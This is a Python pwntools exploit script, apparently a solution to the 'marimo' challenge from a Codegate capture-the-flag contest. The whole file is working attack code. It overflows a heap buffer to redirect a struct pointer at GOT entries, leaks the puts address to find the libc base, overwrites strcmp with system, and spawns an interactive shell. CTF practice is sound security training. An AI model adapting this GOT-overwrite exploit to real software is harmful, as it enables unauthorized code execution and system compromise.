from pwn import *
import ctypes

LIBC = ctypes.cdll.LoadLibrary("./libc.so.6")

elf=ELF("./marimo")
libc=ELF("./libc.so.6")

p=process("./marimo")
#p=remote("ch41l3ng3s.codegate.kr", 3333)

def show_me_marimo(name, profile):
    p.sendline("show me the marimo")
    print p.recv()
    p.sendline(name)
    print p.recv()
    p.sendline(profile)
    print p.recv()

def edit(idx, profile):
    p.sendline("V")
    print p.recv()
    p.sendline(str(idx))
    print p.recv()
    p.sendline("M")
    print p.recv()
    p.sendline(profile)
    print p.recv()
    p.sendline("B")
    print p.recv()

#gdb.attach(p, "tracemalloc on\nc")

show_me_marimo("1","1")
show_me_marimo("2","2")

time.sleep(2)

edit(0, "A"*0x30+p32(LIBC.time(0))+p32(0x100)+p64(elf.got['puts'])+p64(elf.got['strcmp']))

p.sendline("V")
print p.recv()
p.sendline("1")
print p.recvuntil("name : ")
puts = u64(p.recv(6).ljust(8,"\x00"))
print p.recv()
libc_base = puts - libc.symbols['puts']
libc.address = libc_base
system = libc.symbols['system']

p.sendline("M")
print p.recv()
p.sendline(p64(system)[:-1])
print p.recv()
p.sendline("B")
print p.recv()
p.sendline("sh")

print 'system -> ', hex(system)

p.interactive()
